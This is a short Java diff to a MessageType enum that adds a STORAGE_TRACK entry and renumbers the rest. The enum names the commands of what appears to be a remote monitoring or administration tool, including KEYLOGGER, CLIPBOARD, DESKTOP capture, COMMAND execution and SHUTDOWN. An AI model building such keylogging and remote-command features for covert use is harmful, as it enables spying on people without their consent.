@@ -3,16 +3,17 @@ package Ultils;
 public enum MessageType {
     HARDWARE_INFO(1),
     PERFORMANCE_TRACK(2),
-    END_PROCESS(3),
-    DESKTOP(4),
-    KEYLOGGER(5),
-    CLIPBOARD(6),
-    LOGOFF(7),
-    SHUTDOWN(8),
-    COMMAND(9),
-    ALTF4(10),
-    MESSAGE_BOX(11),
-    GUI_TEXT(12);
+    STORAGE_TRACK(3),
+    END_PROCESS(4),
+    DESKTOP(5),
+    KEYLOGGER(6),
+    CLIPBOARD(7),
+    LOGOFF(8),
+    SHUTDOWN(9),
+    COMMAND(10),
+    ALTF4(11),
+    MESSAGE_BOX(12),
+    GUI_TEXT(13);
 
     private int id;
 
